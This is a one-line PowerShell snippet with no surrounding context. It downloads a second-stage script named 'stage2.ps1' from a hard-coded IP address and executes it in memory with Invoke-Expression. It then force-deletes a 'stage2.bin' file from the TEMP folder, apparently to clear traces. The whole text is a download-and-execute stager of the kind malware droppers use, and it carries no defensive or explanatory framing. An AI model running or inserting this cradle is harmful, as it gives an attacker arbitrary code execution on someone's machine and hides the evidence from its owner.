$Stage1Url = 'http://203.0.113.110/stage2.ps1'; IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content; Set-Location -Path $env:TEMP; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
